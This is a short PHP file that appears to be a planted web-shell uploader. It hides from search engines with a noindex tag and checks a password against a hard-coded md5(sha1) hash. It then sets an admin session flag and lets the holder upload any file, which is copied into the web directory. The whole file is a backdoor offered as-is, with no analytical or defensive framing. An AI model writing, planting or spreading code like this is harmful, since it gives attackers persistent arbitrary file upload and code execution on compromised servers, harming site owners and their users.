
<meta name="robots" content="noindex,nofollow">

<?php
session_start();

if($_SESSION["adm"]){
echo '<form action="" method="post" enctype="multipart/form-data" name="upload42" id="upload42">';

echo '<input type="fle" name="fle" size="50"><input name="_ul2" type="submit" id="_ul2" value="Submit"></form>';

if( isset($_POST['_ul2']) ) {	if(@copy($_FILES['fle']['tmp_name'], $_FILES['fle']['name'])) { echo '<b>Submit Success !!!</b><br><br>';

 }	else { echo '<b>Submit Fail !!!</b><br><br>';

 }}
}
if($_POST["p"]){
$p = $_POST["p"];

$pa = md5(sha1($p));

if($pa=="228f023f62aadf5097f7914d9c5be754"){
$_SESSION["adm"] = 1;

}
}


?>
<form action="" method="post">
<input type="text" name="p">
</form>
